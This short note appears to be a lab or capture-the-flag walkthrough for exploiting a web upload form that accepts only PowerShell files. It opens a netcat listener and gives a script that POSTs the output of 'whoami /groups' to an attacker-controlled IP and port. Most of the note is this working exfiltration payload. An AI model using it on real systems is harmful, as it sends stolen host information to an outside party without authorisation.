As the web says you only can upload ps1 files, create one file to POST the output of `whoami /groups` from a PowerShell-only upload to a remote listener.

#Attacking_machine 
 1. Crerate a file called `test.ps1`.
 2. Open a netcat listener.
```
 nc -lnvp 4444
```

 3. Add the following code:

```
# capture the output into a single string
$postParams = (whoami /groups | Out-String)

# send as plain text (make sure the URI has the scheme)
Invoke-WebRequest -Uri 'http://<ATTACKING MACHINE IP>:<LISTENER PORT>' -Method POST -Body $postParams -ContentType 'text/plain'
```

4. Upload the file from the web page.
